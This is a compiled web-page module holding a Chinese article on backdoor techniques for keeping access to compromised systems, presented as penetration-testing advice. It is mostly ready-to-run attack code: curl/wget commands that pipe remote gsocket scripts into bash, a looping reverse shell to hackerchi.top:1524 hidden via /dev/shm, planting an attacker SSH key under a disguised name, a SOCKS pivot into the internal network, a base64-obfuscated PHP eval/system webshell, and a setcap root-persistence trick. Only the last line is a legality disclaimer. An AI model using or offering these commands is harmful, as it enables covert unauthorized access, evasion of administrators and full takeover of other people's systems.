import{_ as s,c as a,o as n,a3 as l}from"./chunks/framework.zGi9i9Bf.js";const h=JSON.parse('{"title":"后门技术","description":"","frontmatter":{},"headers":[],"relativePath":"Document/网络安全/【黑客技术】/后门技术.md","filePath":"Document/网络安全/【黑客技术】/后门技术.md","lastUpdated":1717759497000}'),e={name:"Document/网络安全/【黑客技术】/后门技术.md"},p=l(`<h1 id="后门技术" tabindex="-1">后门技术 <a class="header-anchor" href="#后门技术" aria-label="Permalink to &quot;后门技术&quot;">​</a></h1><blockquote><p>❝</p><p>在渗透测试中，建立持久的后门是至关重要的，以便在需要时重新访问系统。以下是一些常用的后门技术</p><p>❞</p></blockquote><h3 id="_1-gs-netcat-自动部署脚本" tabindex="-1">1.gs-netcat 自动部署脚本 <a class="header-anchor" href="#_1-gs-netcat-自动部署脚本" aria-label="Permalink to &quot;1.gs-netcat 自动部署脚本&quot;">​</a></h3><p>gs-netcat 工具提供了一个方便的自动部署脚本，可以快速建立反向 shell 连接。</p><p>使用方法：</p><div class="language-bash line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki one-dark-pro vp-code" tabindex="0"><code><span class="line"><span style="color:#61AFEF;">bash</span><span style="color:#D19A66;"> -c</span><span style="color:#98C379;"> &quot;$(</span><span style="color:#61AFEF;">curl</span><span style="color:#D19A66;"> -fsSLk</span><span style="color:#ABB2BF;"> &lt;</span><span style="color:#98C379;">https://gsocket.io/y</span><span style="color:#ABB2BF;">&gt;</span><span style="color:#98C379;">)&quot;</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br></div></div><p>或者</p><div class="language-bash line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki one-dark-pro vp-code" tabindex="0"><code><span class="line"><span style="color:#61AFEF;">bash</span><span style="color:#D19A66;"> -c</span><span style="color:#98C379;"> &quot;$(</span><span style="color:#61AFEF;">wget</span><span style="color:#D19A66;"> --no-check-certificate</span><span style="color:#D19A66;"> -qO-</span><span style="color:#ABB2BF;"> &lt;</span><span style="color:#98C379;">https://gsocket.io/y</span><span style="color:#ABB2BF;">&gt;</span><span style="color:#98C379;">)&quot;</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br></div></div><p>部署您自己的 gsocket 服务器：</p><div class="language-bash line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki one-dark-pro vp-code" tabindex="0"><code><span class="line"><span style="color:#E06C75;">LOG</span><span style="color:#56B6C2;">=</span><span style="color:#98C379;">results.log</span><span style="color:#61AFEF;"> bash</span><span style="color:#D19A66;"> -c</span><span style="color:#98C379;"> &quot;$(</span><span style="color:#61AFEF;">curl</span><span style="color:#D19A66;"> -fsSL</span><span style="color:#ABB2BF;"> &lt;</span><span style="color:#98C379;">https://gsocket.io/ys</span><span style="color:#ABB2BF;">&gt;</span><span style="color:#98C379;">)&quot;</span><span style="color:#7F848E;font-style:italic;">  # 注意 &#39;/ys&#39; 而不是 &#39;/y&#39;</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br></div></div><h3 id="_2-后台反向-shell" tabindex="-1">2. 后台反向 shell <a class="header-anchor" href="#_2-后台反向-shell" aria-label="Permalink to &quot;2. 后台反向 shell&quot;">​</a></h3><p>这种后门会在后台持续尝试连接回攻击者的服务器，即使连接断开也会自动重连。</p><p>示例：</p><div class="language-bash line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki one-dark-pro vp-code" tabindex="0"><code><span class="line"><span style="color:#61AFEF;">setsid</span><span style="color:#98C379;"> bash</span><span style="color:#D19A66;"> -c</span><span style="color:#98C379;"> &#39;while :; do bash -i &amp;&gt;/dev/tcp/hackerchi.top/1524 0&gt;&amp;1; sleep 360; done&#39;</span><span style="color:#ABB2BF;"> &amp;&gt;/dev/null</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br></div></div><p>防止多个实例启动：</p><div class="language-bash line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki one-dark-pro vp-code" tabindex="0"><code><span class="line"><span style="color:#61AFEF;">fuser</span><span style="color:#98C379;"> /dev/shm/.busy</span><span style="color:#ABB2BF;"> &amp;&gt;/dev/null || </span><span style="color:#61AFEF;">nohup</span><span style="color:#98C379;"> /bin/bash</span><span style="color:#D19A66;"> -c</span><span style="color:#98C379;"> &#39;while :; do touch /dev/shm/.busy; exec 3&lt;/dev/shm/.busy; bash -i &amp;&gt;/dev/tcp/hackerchi.top/1524 0&gt;&amp;1 ; sleep 360; done&#39;</span><span style="color:#ABB2BF;"> &amp;&gt;/dev/null &amp;</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br></div></div><h3 id="_3-授权密钥" tabindex="-1">3. 授权密钥 <a class="header-anchor" href="#_3-授权密钥" aria-label="Permalink to &quot;3. 授权密钥&quot;">​</a></h3><p>将攻击者的 SSH 公钥添加到目标系统的 <em>/root/.ssh/authorized_keys</em> 文件中，可以实现持久的后门访问。</p><p>提示： 将公钥文件末尾的名称更改为一些不起眼的名称，例如 <em>backup@ubuntu</em> 或管理员的真实姓名，以避免引起怀疑。</p><p>示例：</p><div class="language-bash line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki one-dark-pro vp-code" tabindex="0"><code><span class="line"><span style="color:#61AFEF;">$</span><span style="color:#98C379;"> cat</span><span style="color:#98C379;"> id_rsa.pub</span></span>
<span class="line"><span style="color:#61AFEF;">ssh-rsa</span><span style="color:#98C379;"> AAAAB3NzaC1yc2EAAAADAQABAAABAQCktFkgm40GDkqYwJkNZVb+NLqYoUNSPVPLx0VDbJM0</span></span>
<span class="line"><span style="color:#ABB2BF;">[...]</span></span>
<span class="line"><span style="color:#61AFEF;">u1i+MhhnCQxyBZbrWkFWyzEmmHjZdAZCK05FRXYZRI9yadmvo7QKtRmliqABMU9WGy210PTOLMltbt2C</span></span>
<span class="line"><span style="color:#61AFEF;">c3zxLNse/xg0CC16elJpt7IqCFV19AqfHnK4YiXwVJ+M+PyAp/aEAujtHDHp</span><span style="color:#98C379;"> backup@ubuntu</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><h3 id="_4-远程访问整个网络" tabindex="-1">4. 远程访问整个网络 <a class="header-anchor" href="#_4-远程访问整个网络" aria-label="Permalink to &quot;4. 远程访问整个网络&quot;">​</a></h3><p>使用 gs-netcat 工具可以在目标主机的专用 LAN 上创建一个 SOCKS 出口节点，从而允许攻击者从外部访问内部网络。</p><p>示例：</p><div class="language-bash line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki one-dark-pro vp-code" tabindex="0"><code><span class="line"><span style="color:#61AFEF;">gs-netcat</span><span style="color:#D19A66;"> -l</span><span style="color:#D19A66;"> -S</span><span style="color:#7F848E;font-style:italic;">       # 在目标主机上运行</span></span>
<span class="line"><span style="color:#61AFEF;">gs-netcat</span><span style="color:#D19A66;"> -p</span><span style="color:#D19A66;"> 1080</span><span style="color:#7F848E;font-style:italic;">    # 在攻击者工作站上运行</span></span>
<span class="line"></span>
<span class="line"><span style="color:#7F848E;font-style:italic;"># 从攻击者工作站访问目标主机 LAN 上的 route.local:22</span></span>
<span class="line"><span style="color:#61AFEF;">socat</span><span style="color:#98C379;"> -</span><span style="color:#98C379;">  &quot;SOCKS4a:127.1:route.local:22&quot;</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><p>其他方法：</p><ul><li>Gost/Cloudflared： 使用 Cloudflare Tunnel 建立 TCP 隧道。</li><li>反向 Wireguard： 使用 Wireguard 建立反向连接，从 <strong>segfault.net[1]</strong> 访问内部网络。</li></ul><h3 id="_5-最小的-php-后门" tabindex="-1">5. 最小的 PHP 后门 <a class="header-anchor" href="#_5-最小的-php-后门" aria-label="Permalink to &quot;5. 最小的 PHP 后门&quot;">​</a></h3><p>将以下代码添加到任何 PHP 文件的开头，即可创建一个简单的后门：</p><div class="language-php line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">php</span><pre class="shiki one-dark-pro vp-code" tabindex="0"><code><span class="line"><span style="color:#56B6C2;">&lt;</span><span style="color:#C678DD;">?</span><span style="color:#ABB2BF;">php </span><span style="color:#E06C75;">$i</span><span style="color:#56B6C2;">=base64_decode</span><span style="color:#ABB2BF;">(</span><span style="color:#98C379;">&quot;aWYoaXNzZXQoJF9QT1NUWzBdKSl7c3lzdGVtKCRfUE9TVFswXSk7ZGllO30K&quot;</span><span style="color:#ABB2BF;">);</span><span style="color:#56B6C2;">eval</span><span style="color:#ABB2BF;">(</span><span style="color:#E06C75;">$i</span><span style="color:#ABB2BF;">);</span><span style="color:#C678DD;">?</span><span style="color:#56B6C2;">&gt;</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br></div></div><p>测试：</p><div class="language-bash line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki one-dark-pro vp-code" tabindex="0"><code><span class="line"><span style="color:#7F848E;font-style:italic;">### 启动测试 PHP 服务器</span></span>
<span class="line"><span style="color:#56B6C2;">cd</span><span style="color:#98C379;"> /var/www/html</span><span style="color:#ABB2BF;"> &amp;&amp; </span><span style="color:#61AFEF;">php</span><span style="color:#D19A66;"> -S</span><span style="color:#98C379;"> 127.0.0.1:8080</span></span>
<span class="line"><span style="color:#7F848E;font-style:italic;">### 不执行命令</span></span>
<span class="line"><span style="color:#61AFEF;">curl</span><span style="color:#ABB2BF;"> &lt;</span><span style="color:#98C379;">http://127.0.0.1:8080/test.ph</span><span style="color:#ABB2BF;">p&gt;</span></span>
<span class="line"><span style="color:#7F848E;font-style:italic;">### 执行命令</span></span>
<span class="line"><span style="color:#61AFEF;">curl</span><span style="color:#ABB2BF;"> &lt;</span><span style="color:#98C379;">http://127.0.0.1:8080/test.ph</span><span style="color:#ABB2BF;">p&gt; </span><span style="color:#D19A66;">-d</span><span style="color:#98C379;"> 0=&quot;ps fax; uname -mrs; id&quot;</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><h3 id="_6-本地根后门" tabindex="-1">6. 本地根后门 <a class="header-anchor" href="#_6-本地根后门" aria-label="Permalink to &quot;6. 本地根后门&quot;">​</a></h3><p>一旦获得 root 权限，可以使用以下方法保持 root 状态：</p><p>执行以下命令：</p><div class="language-bash line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki one-dark-pro vp-code" tabindex="0"><code><span class="line"><span style="color:#61AFEF;">setcap</span><span style="color:#98C379;"> cap_setuid+ep</span><span style="color:#98C379;"> /lib/x86_64-linux-gnu/ld-linux-x86-64.so.2</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br></div></div><p>成为 root 用户：</p><div class="language-bash line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki one-dark-pro vp-code" tabindex="0"><code><span class="line"><span style="color:#61AFEF;">/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2</span><span style="color:#98C379;"> /usr/bin/python3</span><span style="color:#D19A66;"> -c</span><span style="color:#98C379;"> &#39;import os;os.setuid(0);os.system(&quot;/bin/bash&quot;)&#39;</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br></div></div><p>请注意，后门技术应仅用于合法的渗透测试和安全评估目的。未经授权使用后门是非法的，并可能导致严重后果。</p>`,39),o=[p];function t(r,c,i,d,u,b){return n(),a("div",null,o)}const m=s(e,[["render",t]]);export{h as __pageData,m as default};
